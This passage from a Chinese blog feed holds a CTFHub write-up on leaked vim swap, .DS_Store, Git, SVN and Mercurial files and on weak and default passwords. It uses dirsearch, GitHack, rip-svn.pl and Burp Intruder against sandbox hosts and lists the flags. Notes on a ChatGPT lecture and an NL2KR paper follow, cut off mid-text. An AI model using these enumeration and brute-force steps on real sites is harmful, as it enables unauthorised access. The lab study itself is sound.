href=\"#vim缓存\">#</a> vim 缓存</h3>\n<h4 id=\"0x01-提示-3\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-3\">#</a> 0x01 提示</h4>\n<p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当 vim 异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>\n<h4 id=\"0x02-题目-2\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-2\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023105952658.png\" alt=\"image-20231023105952658\"></p>\n<h4 id=\"0x03-方法一-使用-dirsearch-延时查找\"><a class=\"markdownIt-Anchor\" href=\"#0x03-方法一-使用-dirsearch-延时查找\">#</a> 0x03 方法一 ：使用 dirsearch 延时查找</h4>\n<pre><code>dirsearch -u http://challenge-f8ac603be2129fb8.sandbox.ctfhub.com:10800 -s 1    # 延时1秒\n</code></pre>\n<p><img data-src=\"image-20231023111535783.png\" alt=\"image-20231023111535783\"></p>\n<h4 id=\"0x04-方法二了解相关文件名\"><a class=\"markdownIt-Anchor\" href=\"#0x04-方法二了解相关文件名\">#</a> 0x04 方法二：了解相关文件名</h4>\n<p>vim 在运行过程中会产生 swp 文件，如果程序异常退出 swp 文件可能被保留，第二次异常就变成 swo，第三次变成 swn。按照上题的思路，在原题 url 中加入  <code>.index.php.swp</code> ，文件名的最前面要有一个 “.”。</p>\n<p>下载文件  <code>.index.php.swp</code> ，打开进行查找：</p>\n<p><img data-src=\"image-20231023110947994.png\" alt=\"image-20231023110947994\"></p>\n<p>flag 为 ： <code>ctfhub&#123;70e0afb290e77337cb06d325&#125;</code></p>\n<h3 id=\"ds_store\"><a class=\"markdownIt-Anchor\" href=\"#ds_store\">#</a> .DS_Store</h3>\n<h4 id=\"0x01-提示-4\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-4\">#</a> 0x01 提示</h4>\n<p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store 可以知道这个目录里面所有文件的清单。</p>\n<h4 id=\"0x02-题目-3\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-3\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023112241272.png\" alt=\"image-20231023112241272\"></p>\n<h4 id=\"0x03-解\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解\">#</a> 0x03 解</h4>\n<p>直接访问：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>http://challenge-24627cb979c9f911.sandbox.ctfhub.com:10800/.DS_Store</pre></td></tr></table></figure><p>或者使用 dirsearch 可以得知，网站可访问  <code>.DS_Store</code></p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dirsearch <span class=\"token parameter variable\">-u</span> http://challenge-24627cb979c9f911.sandbox.ctfhub.com:10800/ <span class=\"token parameter variable\">-s</span> <span class=\"token number\">1</span></pre></td></tr></table></figure><p><img data-src=\"image-20231023112400093.png\" alt=\"image-20231023112400093\"></p>\n<p>下载该文件，并使用记事本打开：</p>\n<p><img data-src=\"image-20231023112455877.png\" alt=\"image-20231023112455877\"></p>\n<p>得到  <code>6453df75efb4542d8ba3dc7d4ab53fc2.txt</code>  就是我们需要二次访问的文件地址</p>\n<p>访问得到 flag</p>\n<pre><code>http://challenge-24627cb979c9f911.sandbox.ctfhub.com:10800/6453df75efb4542d8ba3dc7d4ab53fc2.txt\n</code></pre>\n<p><img data-src=\"image-20231023112201977.png\" alt=\"image-20231023112201977\"></p>\n<p><code>ctfhub&#123;83d1b8a015ecfa71c468b5e3&#125;</code></p>\n<h2 id=\"git泄露\"><a class=\"markdownIt-Anchor\" href=\"#git泄露\">#</a> Git 泄露</h2>\n<h3 id=\"log\"><a class=\"markdownIt-Anchor\" href=\"#log\">#</a> Log</h3>\n<h4 id=\"0x01-提示-5\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-5\">#</a> 0x01 提示</h4>\n<p>当前大量开发人员使用 git 进行版本控制，对站点自动部署。如果配置不当，可能会将.git 文件夹直接部署到线上环境。这就引起了 git 泄露漏洞。请尝试使用 BugScanTeam 的 GitHack 完成本题</p>\n<h4 id=\"0x02-题目-4\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-4\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023145909878.png\" alt=\"image-20231023145909878\"></p>\n<h4 id=\"0x03-解答\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解答\">#</a> 0x03 解答</h4>\n<p>根据提示使用 GitHack 工具对网站的 .git 文件进行处理</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python2 GitHack.py http://challenge-87d743a3ff8b665c.sandbox.ctfhub.com:10800/.git</pre></td></tr></table></figure><p><img data-src=\"image-20231023150501551.png\" alt=\"image-20231023150501551\"></p>\n<p><img data-src=\"image-20231023150549583.png\" alt=\"image-20231023150549583\"></p>\n<p>之后我们 cd 进入到克隆的文件夹中，使用 git log 查看 git 的历史记录：</p>\n<figure class=\"highlight git\"><figcaption data-lang=\"git\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>git log</pre></td></tr></table></figure><p><img data-src=\"image-20231023151232167.png\" alt=\"image-20231023151232167\"></p>\n<p>可以看到，最近的一次操作是将 flag 移除了，为了得到 flag 我们需要回退到 add flag 那个分支上。</p>\n<pre><code>git reset --hard HEAD^\n</code></pre>\n<p><img data-src=\"image-20231023151533695.png\" alt=\"image-20231023151533695\"></p>\n<hr>\n<p>也可以使用</p>\n<pre><code>git diff HEAD^\n</code></pre>\n<p>通过比较两个版本的不同，也可以得到正确答案。</p>\n<hr>\n<p>此时就可以查看到 flag 文件了</p>\n<p><img data-src=\"image-20231023151607766.png\" alt=\"image-20231023151607766\"></p>\n<p><code>ctfhub&#123;003a15e85e08f988da3d91b7&#125;</code></p>\n<h3 id=\"stash\"><a class=\"markdownIt-Anchor\" href=\"#stash\">#</a> Stash</h3>\n<h4 id=\"0x01-提示-6\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-6\">#</a> 0x01 提示</h4>\n<p>当前大量开发人员使用 git 进行版本控制，对站点自动部署。如果配置不当，可能会将.git 文件夹直接部署到线上环境。这就引起了 git 泄露漏洞。请尝试使用 BugScanTeam 的 GitHack 完成本题</p>\n<h4 id=\"0x02-题目-5\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-5\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023153203629.png\" alt=\"image-20231023153203629\"></p>\n<h4 id=\"0x03-解答-2\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解答-2\">#</a> 0x03 解答</h4>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdG9jeS9wL2dpdC1zdGFzaC1yZWZlcmVuY2UuaHRtbA==\">git stash 用法</span></p>\n<p><code>git stash</code> （git 储藏）会把所有未提交的修改（包括暂存的和非暂存的）都保存起来，用于后续恢复当前工作目录。</p>\n<pre><code>git stash list\t\t//查看现有stash\ngit stash pop\t\t//恢复之前缓存的工作目录\n</code></pre>\n<p>首先使用 GitHack 得到 git 文件夹</p>\n<pre><code>python2 GitHack.py http://challenge-fb9e5bf47ae06169.sandbox.ctfhub.com:10800/.git\n</code></pre>\n<p>进入文件夹，使用 git stash list 查看现有的 stash</p>\n<p><img data-src=\"image-20231023154642571.png\" alt=\"image-20231023154642571\"></p>\n<p>再使用 git stash pop 恢复之前缓存的工作目录</p>\n<p><img data-src=\"image-20231023154822527.png\" alt=\"image-20231023154822527\"></p>\n<p>得到我们需要的 flag 所在的文件，获取即可</p>\n<p><img data-src=\"image-20231023154849548.png\" alt=\"image-20231023154849548\"></p>\n<p><code>ctfhub&#123;5bf4e75c6fa8396319a1a39a&#125;</code></p>\n<h3 id=\"index\"><a class=\"markdownIt-Anchor\" href=\"#index\">#</a> Index</h3>\n<h4 id=\"0x01-提示-7\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-7\">#</a> 0x01 提示</h4>\n<p>当前大量开发人员使用 git 进行版本控制，对站点自动部署。如果配置不当，可能会将.git 文件夹直接部署到线上环境。这就引起了 git 泄露漏洞。请尝试使用 BugScanTeam 的 GitHack 完成本题</p>\n<h4 id=\"0x02-题目-6\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-6\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023155043808.png\" alt=\"image-20231023155043808\"></p>\n<h4 id=\"0x03-解答-3\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解答-3\">#</a> 0x03 解答</h4>\n<p>本题感觉没什么特别的，使用 GitHack 直接对 git 文件进行提取，在文件夹中直接查看 log 就可以得知当前状态就是含有 flag 的状态，直接获取 flag 文件即可</p>\n<p><img data-src=\"image-20231023155719415.png\" alt=\"image-20231023155719415\"></p>\n<p><code>ctfhub&#123;8197e9362ebfd50e1be1e9bf&#125;</code></p>\n<h2 id=\"svn泄露\"><a class=\"markdownIt-Anchor\" href=\"#svn泄露\">#</a> SVN 泄露</h2>\n<h4 id=\"0x01-提示-8\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-8\">#</a> 0x01 提示</h4>\n<p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当，可能会将.svn 文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>\n<h4 id=\"0x02-题目-7\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-7\">#</a> 0x02 题目</h4>\n<p><img data-src=\"image-20231023160418343.png\" alt=\"image-20231023160418343\"></p>\n<h4 id=\"0x03-解答-4\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解答-4\">#</a> 0x03 解答</h4>\n<p>首先使用 dirsearch 进行一下内容查看</p>\n<pre><code>dirsearch -u http://challenge-a61e31b7c2e824c9.sandbox.ctfhub.com:10800/ -s 1\n</code></pre>\n<p>发现了 svn 文件</p>\n<p><img data-src=\"image-20231023160624976.png\" alt=\"image-20231023160624976\"></p>\n<p>我们在 kali 中，使用  <code>dvcs-ripper</code>  中的 <code>rip-svn.pl</code>  脚本进行 clone：</p>\n<pre><code>perl rip-svn.pl -u http://challenge-5849ad3280c96ef4.sandbox.ctfhub.com:10800/.svn\n</code></pre>\n<p><img data-src=\"image-20231023172757585.png\" alt=\"image-20231023172757585\"></p>\n<p>使用  <code>ls -al</code>  查看新增加的文件</p>\n<p><img data-src=\"image-20231023172917893.png\" alt=\"image-20231023172917893\"></p>\n<p>前往 .svn 文件夹内</p>\n<p><img data-src=\"image-20231023173024409.png\" alt=\"image-20231023173024409\"></p>\n<p>可以发现 wc.db 文件在其中，使用如下命令，查找有关 flag 的内容</p>\n<pre><code>cat wc.db | grep -a flag\n</code></pre>\n<p>发现 flag 但是如果直接访问会发现不存在</p>\n<p><img data-src=\"image-20231023173557538.png\" alt=\"image-20231023173557538\"></p>\n<p><img data-src=\"image-20231023173133950.png\" alt=\"image-20231023173133950\"></p>\n<p>转而寻找  <code>.svn/pristine/</code>  中的文件</p>\n<p><img data-src=\"image-20231023173251159.png\" alt=\"image-20231023173251159\"></p>\n<p>可以发现有两个字典  <code>bf</code>  和  <code>64</code></p>\n<p>使用  <code>cat bf/bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base</code>  得到：</p>\n<p><img data-src=\"image-20231023173328598.png\" alt=\"image-20231023173328598\"></p>\n<p>我们在数据库中可以找到对应关系：</p>\n<p><img data-src=\"image-20231023173355946.png\" alt=\"image-20231023173355946\"></p>\n<p><img data-src=\"image-20231023173404918.png\" alt=\"image-20231023173404918\"></p>\n<p>可以发现，第一个开头是 bf 的，对应的正是 index.html，那么我们只要使用 下方 64 开头的进行字典对应，就可以获得 flag：</p>\n<p><img data-src=\"image-20231023173521812.png\" alt=\"image-20231023173521812\"></p>\n<p><code>ctfhub&#123;9120bf8882d07e7ccafa434f&#125;</code></p>\n<h4 id=\"0x04-备注\"><a class=\"markdownIt-Anchor\" href=\"#0x04-备注\">#</a> 0x04 备注</h4>\n<p>可以直接使用  <code>tree .svn</code>  查看其中的关系</p>\n<p><img data-src=\"image-20231023173816807.png\" alt=\"image-20231023173816807\"></p>\n<h2 id=\"hg泄露\"><a class=\"markdownIt-Anchor\" href=\"#hg泄露\">#</a> HG 泄露</h2>\n<h3 id=\"0x01-提示-9\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-9\">#</a> 0x01 提示</h3>\n<p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当，可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>\n<h3 id=\"0x02-题目-8\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-8\">#</a> 0x02 题目</h3>\n<p><img data-src=\"image-20231028093921547.png\" alt=\"image-20231028093921547\"></p>\n<h3 id=\"0x03-解答-5\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解答-5\">#</a> 0x03 解答</h3>\n<p>首先使用 dirsearch 进行文件检索</p>\n<pre><code>dirsearch -u http://challenge-1bc16caa950039f9.sandbox.ctfhub.com:10800/ -s 0.5\n</code></pre>\n<p><img data-src=\"image-20231028094148045.png\" alt=\"image-20231028094148045\"></p>\n<p>发现了  <code>.hg</code>  文件，尝试访问  <code>dirstate</code>  文件，下载下来，打开后发现：</p>\n<p><img data-src=\"image-20231028094534632.png\" alt=\"image-20231028094534632\"></p>\n<p><code>flag_2785532634.txt</code>  文件，对其进行访问就可以拿到 flag 了：</p>\n<p><img data-src=\"image-20231028094609448.png\" alt=\"image-20231028094609448\"></p>\n<p><code>ctfhub&#123;ec974c7b92f1ba4fceb75f44&#125;</code></p>\n<h1 id=\"密码口令\"><a class=\"markdownIt-Anchor\" href=\"#密码口令\">#</a> 密码口令</h1>\n<h2 id=\"弱口令\"><a class=\"markdownIt-Anchor\" href=\"#弱口令\">#</a> 弱口令</h2>\n<h3 id=\"0x01-提示-10\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-10\">#</a> 0x01 提示</h3>\n<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。</p>\n<h3 id=\"0x02-题目-9\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-9\">#</a> 0x02 题目</h3>\n<p><img data-src=\"image-20231028100334921.png\" alt=\"image-20231028100334921\"></p>\n<h3 id=\"0x03-burp-suite-intruder的4种攻击类型\"><a class=\"markdownIt-Anchor\" href=\"#0x03-burp-suite-intruder的4种攻击类型\">#</a> 0x03 Burp Suite Intruder 的 4 种攻击类型</h3>\n<h4 id=\"sniper狙击手模式\"><a class=\"markdownIt-Anchor\" href=\"#sniper狙击手模式\">#</a> ** Sniper（狙击手模式）**</h4>\n<p>狙击手模式使用一组 payload 集合，它一次只使用一个 payload 位置，假设你标记了两个位置 “A” 和 “B”，payload 值为 “1” 和 “2”，那么它攻击会形成以下组合（除原始数据外）：</p>\n<table>\n<thead>\n<tr>\n<th>attack NO.</th>\n<th>location A</th>\n<th>location B</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>no replace</td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>no replace</td>\n</tr>\n<tr>\n<td>3</td>\n<td>no replace</td>\n<td>1</td>\n</tr>\n<tr>\n<td>4</td>\n<td>no replace</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"battering-ram攻城锤模式\"><a class=\"markdownIt-Anchor\" href=\"#battering-ram攻城锤模式\">#</a> <strong>Battering ram（攻城锤模式）</strong></h4>\n<p>攻城锤模式与狙击手模式类似的地方是，同样只使用一个 payload 集合，不同的地方在于每次攻击都是替换所有 payload 标记位置，而狙击手模式每次只能替换一个 payload 标记位置。</p>\n<table>\n<thead>\n<tr>\n<th>attack NO.</th>\n<th>location A</th>\n<th>location B</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>1</td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>2</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"pitchfork草叉模式\"><a class=\"markdownIt-Anchor\" href=\"#pitchfork草叉模式\">#</a> <strong>Pitchfork（草叉模式）</strong></h4>\n<p>草叉模式允许使用多组 payload 组合，在每个标记位置上遍历所有 payload 组合，假设有两个位置 “A” 和 “B”，payload 组合 1 的值为 “1” 和 “2”，payload 组合 2 的值为 “3” 和 “4”，则攻击模式如下：</p>\n<table>\n<thead>\n<tr>\n<th>attack NO.</th>\n<th>location A</th>\n<th>location B</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>3</td>\n</tr>\n<tr>\n<td>2</td>\n<td>2</td>\n<td>4</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"cluster-bomb集束炸弹模式\"><a class=\"markdownIt-Anchor\" href=\"#cluster-bomb集束炸弹模式\">#</a> <strong>Cluster bomb（集束炸弹模式）</strong></h4>\n<p>集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对 payload 组进行笛卡尔积，还是上面的例子，如果用集束炸弹模式进行攻击，则除 baseline 请求外，会有四次请求：</p>\n<table>\n<thead>\n<tr>\n<th>attack NO.</th>\n<th>location A</th>\n<th>location B</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>3</td>\n</tr>\n<tr>\n<td>2</td>\n<td>1</td>\n<td>4</td>\n</tr>\n<tr>\n<td>3</td>\n<td>2</td>\n<td>3</td>\n</tr>\n<tr>\n<td>4</td>\n<td>2</td>\n<td>4</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"0x04-解题\"><a class=\"markdownIt-Anchor\" href=\"#0x04-解题\">#</a> 0x04 解题</h3>\n<p>解决本题需要使用 Burp 的暴力破解功能，首先随意输入一些内容，进行登录，在 Burp 中可以看到 request 请求：</p>\n<p><img data-src=\"image-20231028100709112.png\" alt=\"image-20231028100709112\"></p>\n<p>右键  <code>send to intruder</code>  / 快捷键 <code>CTRL+I</code>  发送到 intruder 中</p>\n<p>在 Intruder 中在密码部分设置为 payload 添加 符号，作为注入点</p>\n<p><img data-src=\"image-20231029151352738.png\" alt=\"image-20231029151352738\"></p>\n<p>选择密码本进行攻击，多尝试几个密码本就可以找到密码，可以看到，正确登录后的返回长度 2658 和其他长度不一样</p>\n<p><img data-src=\"image-20231029151325266.png\" alt=\"image-20231029151325266\"></p>\n<p>双击查看 response：</p>\n<p><img data-src=\"image-20231029151619413.png\" alt=\"image-20231029151619413\"></p>\n<p>得到 flag： <code>ctfhub&#123;4fbf4b5cf53ff19625acad4f&#125;</code></p>\n<h2 id=\"默认口令\"><a class=\"markdownIt-Anchor\" href=\"#默认口令\">#</a> 默认口令</h2>\n<h3 id=\"0x01-提示-11\"><a class=\"markdownIt-Anchor\" href=\"#0x01-提示-11\">#</a> 0x01 提示</h3>\n<h3 id=\"0x02-题目-10\"><a class=\"markdownIt-Anchor\" href=\"#0x02-题目-10\">#</a> 0x02 题目</h3>\n<p><img data-src=\"image-20231029153534085.png\" alt=\"image-20231029153534085\"></p>\n<h3 id=\"0x03-解答-6\"><a class=\"markdownIt-Anchor\" href=\"#0x03-解答-6\">#</a> 0x03 解答</h3>\n<p>题目提示默认口令说明此题的账户密码是网关默认密码，最后通过以前收集到的常用默认弱口令发现账户密码，获得此题 flag 。</p>\n<p>浏览器搜索 <code>eyou网关默认密码</code> ，检索可用信息发现使用说明手册，可能含有默认密码</p>\n<p><img data-src=\"image-20231029154402660.png\" alt=\"image-20231029154402660\"></p>\n<p>输入默认用户和密码即可进入，取得 flag</p>\n<p><img data-src=\"image-20231029154627031.png\" alt=\"image-20231029154627031\"></p>\n<p><code>ctfhub&#123;9a144963febd150940d7e538&#125;</code></p>\n",
            "tags": [
                "CTFHUB"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/30/%E6%9D%8E%E5%AE%8F%E6%AF%852023%E6%98%A5%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B/",
            "url": "http://yanagi-kon.github.io/2023/10/30/%E6%9D%8E%E5%AE%8F%E6%AF%852023%E6%98%A5%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B/",
            "title": "李宏毅2023春机器学习课程",
            "date_published": "2023-10-30T04:24:13.000Z",
            "content_html": "<h1 id=\"李宏毅2023春机器学习课程\"><a class=\"markdownIt-Anchor\" href=\"#李宏毅2023春机器学习课程\">#</a> 李宏毅 2023 春机器学习课程</h1>\n<h2 id=\"chatgpt-原理刨析\"><a class=\"markdownIt-Anchor\" href=\"#chatgpt-原理刨析\">#</a> ChatGPT 原理刨析</h2>\n<p>ChatGPT 不是联网的，并且目前的回答对于 2021 年以后的信息不太准确。</p>\n<p>ChatGPT 所做的就是 文字接龙（语言模型），获得文字的几率，所以每一次的输出结果可能并不相同，并且在每次选出一个词之后，再将该词语加入到输入之后，继续进行处理，获得下一个文字，直到获得 end。</p>\n<p><img data-src=\"image-20231025170524582.png\" alt=\"image-20231025170524582\"></p>\n<p><img data-src=\"image-20231025170707067.png\" alt=\"image-20231025170707067\"></p>\n<p>为了使 ChatGPT 具有根据历史记录进行回答的能力，其实每一次都会将历史记录也和当前的问题一起丢入输入当中</p>\n<p><img data-src=\"image-20231025170907180.png\" alt=\"image-20231025170907180\"></p>\n<p>这个函数 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi></mrow><annotation encoding=\"application/x-tex\">f</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span></span></span></span> 的参数大概会有 1700 亿个参数。</p>\n<p>ChatGPT 的训练过程：</p>\n<p><img data-src=\"image-20231025171201704.png\" alt=\"image-20231025171201704\"></p>\n<h2 id=\"chatgpt-关键技术-预训练\"><a class=\"markdownIt-Anchor\" href=\"#chatgpt-关键技术-预训练\">#</a> ChatGPT 关键技术 预训练</h2>\n<p><code>预训练</code> （Pre-train）又称为  <code>自督导式学习</code> （Self-supervised Learning），其所得到的模型又被称为 <code>基石模型</code> （Foundation Model）。</p>\n<p>ChatGPT 即 基于 Transformer 预训练的生成式聊天（Chat Generative Pre-trained Transformer）。</p>\n<h3 id=\"0x01-预训练\"><a class=\"markdownIt-Anchor\" href=\"#0x01-预训练\">#</a> 0x01 预训练</h3>\n<p>网络上每一段文字都可以教机器做文字接龙，GPT 就是使用的网络上的内容进行训练。</p>\n<p>GPT-1、GPT-2、GPT-3 在模型上逐渐更大，性能也逐渐更好，从 100 多 M 到 175G，但这个时候没有人来进行干预，所以 GPT 模型的输出有时候是无厘头的。</p>\n<p>GPT 通过督导式训练后才变成了 ChatGPT，经过 <code>微调</code> （finetune）。</p>\n<p><img data-src=\"image-20231025201302259.png\" alt=\"image-20231025201302259\"></p>\n<h3 id=\"0x02-预训练的帮助\"><a class=\"markdownIt-Anchor\" href=\"#0x02-预训练的帮助\">#</a> 0x02 预训练的帮助</h3>\n<p>在多种语言上做预训练，只要教某一种语言的某一个任务，可以自动学会其他语言的同样任务。</p>\n<h3 id=\"0x03-增强式学习\"><a class=\"markdownIt-Anchor\" href=\"#0x03-增强式学习\">#</a> 0x03 增强式学习</h3>\n<p>给与的反馈比较简单，并且适用于答案不确定的情况，只需要给反馈就好了。</p>\n<p><img data-src=\"image-20231025202525131.png\" alt=\"image-20231025202525131\"></p>\n<h2 id=\"chatgpt-带来的研究问题\"><a class=\"markdownIt-Anchor\" href=\"#chatgpt-带来的研究问题\">#</a> ChatGPT 带来的研究问题</h2>\n<h3 id=\"0x01-如何精准提出问题\"><a class=\"markdownIt-Anchor\" href=\"#0x01-如何精准提出问题\">#</a> 0x01 如何精准提出问题</h3>\n<p>对 ChatGPT 进行催眠（Prompting）。</p>\n<p><img data-src=\"image-20231025203022489.png\" alt=\"image-20231025203022489\"></p>\n<h3 id=\"0x02-如何更正错误\"><a class=\"markdownIt-Anchor\" href=\"#0x02-如何更正错误\">#</a> 0x02 如何更正错误</h3>\n<h3 id=\"0x03-如何侦测ai生成\"><a class=\"markdownIt-Anchor\" href=\"#0x03-如何侦测ai生成\">#</a> 0x03 如何侦测 AI 生成</h3>\n<h3 id=\"0x04-不小心泄露秘密\"><a class=\"markdownIt-Anchor\" href=\"#0x04-不小心泄露秘密\">#</a> 0x04 不小心泄露秘密</h3>\n<p>Machine Unlearning</p>\n<h2 id=\"用chatgpt玩文字冒险游戏\"><a class=\"markdownIt-Anchor\" href=\"#用chatgpt玩文字冒险游戏\">#</a> 用 ChatGPT 玩文字冒险游戏</h2>\n<p>首先对 ChatGPT 进行催眠</p>\n<p><img data-src=\"image-20231025204043723.png\" alt=\"image-20231025204043723\"></p>\n<p>再加上游戏插图</p>\n<p><img data-src=\"image-20231025204224842.png\" alt=\"image-20231025204224842\"></p>\n<h2 id=\"chatgpt-是怎么炼成的\"><a class=\"markdownIt-Anchor\" href=\"#chatgpt-是怎么炼成的\">#</a> ChatGPT 是怎么炼成的</h2>\n<h3 id=\"gpt-社会化的过程\"><a class=\"markdownIt-Anchor\" href=\"#gpt-社会化的过程\">#</a> GPT 社会化的过程</h3>\n<p>ChatGPT 和 Insruct GPT 很像，通过 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcnhpdi5vcmcvYWJzLzIyMDMuMDIxNTU=\">Instruct GPT</span> 就可以知道 ChatGPT 是怎么被训练出来的。</p>\n<p><img data-src=\"image-20231029161250167.png\" alt=\"image-20231029161250167\"></p>\n<h3 id=\"chatgpt-学习的四个阶段\"><a class=\"markdownIt-Anchor\" href=\"#chatgpt-学习的四个阶段\">#</a> ChatGPT 学习的四个阶段</h3>\n<h4 id=\"学习文字接龙\"><a class=\"markdownIt-Anchor\" href=\"#学习文字接龙\">#</a> 学习文字接龙</h4>\n<p>不需要人工介入，GPT 自己在网络上学习，GPT 学到的是概率，从概率分布中进行随机抽取，因而 GPT 的每一次输出都是不一样的。</p>\n<p><img data-src=\"image-20231029161642223.png\" alt=\"image-20231029161642223\"></p>\n<p>文字接龙就足够用于进行 问题回答 了，但是回答往往没有目的性。</p>\n<h4 id=\"人类老师引导文字接龙的方向\"><a class=\"markdownIt-Anchor\" href=\"#人类老师引导文字接龙的方向\">#</a> 人类老师引导文字接龙的方向</h4>\n<p>找人来思考想问 GPT 的问题，并人工给出正确答案（告诉 GPT 以后多看这些类似的有益的文句，不要去网络上看一些有的没的）。不需要穷尽所有的问题，我们只要告诉 GPT 人类的偏好，大概提供几个范例就够了。</p>\n<h4 id=\"模仿人类老师的喜好\"><a class=\"markdownIt-Anchor\" href=\"#模仿人类老师的喜好\">#</a> 模仿人类老师的喜好</h4>\n<p>GPT 只要学习人类对哪一类回答的喜爱程度，不需要正确答案，只要知道人类对于答案的选择，就可以通过构建 Teacher Model 学习，自己得知，在众多回答中，哪一个答案是较好的，而哪些答案是差劲的。</p>\n<p><img data-src=\"image-20231029162452659.png\" alt=\"image-20231029162452659\"></p>\n<h4 id=\"用增强式学习向模拟老师学习\"><a class=\"markdownIt-Anchor\" href=\"#用增强式学习向模拟老师学习\">#</a> 用增强式学习向模拟老师学习</h4>\n<p>ChatGPT 进行自问自答，学习应该给出那种回答更正确。</p>\n<p><img data-src=\"image-20231029162750618.png\" alt=\"image-20231029162750618\"></p>\n",
            "tags": [
                "机器学习"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/10/30/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%2010.30/",
            "url": "http://yanagi-kon.github.io/2023/10/30/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%2010.30/",
            "title": "The NL2KR system",
            "date_published": "2023-10-30T00:28:00.000Z",
            "content_html": "<h1 id=\"论文阅读-1030\"><a class=\"markdownIt-Anchor\" href=\"#论文阅读-1030\">#</a> 论文阅读 10.30</h1>\n<h2 id=\"using-inverse-λ-and-generalization-to-translate-english-to-formal-languages\"><a class=\"markdownIt-Anchor\" href=\"#using-inverse-λ-and-generalization-to-translate-english-to-formal-languages\">#</a> Using Inverse λ and Generalization to Translate English to Formal Languages</h2>\n<h2 id=\"the-nl2kr-system\"><a class=\"markdownIt-Anchor\" href=\"#the-nl2kr-system\">#</a> The NL2KR system</h2>\n<p><strong>Chitta Baral、Juraj Dzifcak、Kanchan Kumbhare and Nguyen H. Vo。</strong></p>\n<h3 id=\"abstract\"><a class=\"markdownIt-Anchor\" href=\"#abstract\">#</a> Abstract</h3>\n<p>In this paper they describe the NL2KR system that translates natural language sentences to a targeted knowledge representation formalism.</p>\n<p>该论文提出了一种系统，能讲自然语言句子翻译为有针对性的知识表示形式。</p>\n<p>The system starts with an initial lexicon and learns meaning of new words from a given set of examples of sentences and their translations.</p>\n<p>这个系统从初始词典开始，从一组给定的句子示例及其翻译中学习新单词的含义。</p>\n<p><strong>Keywords: Natural Language Understanding, Lambda Calculus, Knowledge Representation</strong></p>\n<h3 id=\"introduction-and-motivation\"><a class=\"markdownIt-Anchor\" href=\"#introduction-and-motivation\">#</a> Introduction and Motivation</h3>\n<p>自然语言的理解涉及到将自然语言文本翻译成适当的知识表示语言，以便于推理引擎可以使用知识翻译进行推理并给出相应。为了将自然语言翻译成正式的知识陈述，作者建议使用 Montague 的组合方法 [<a 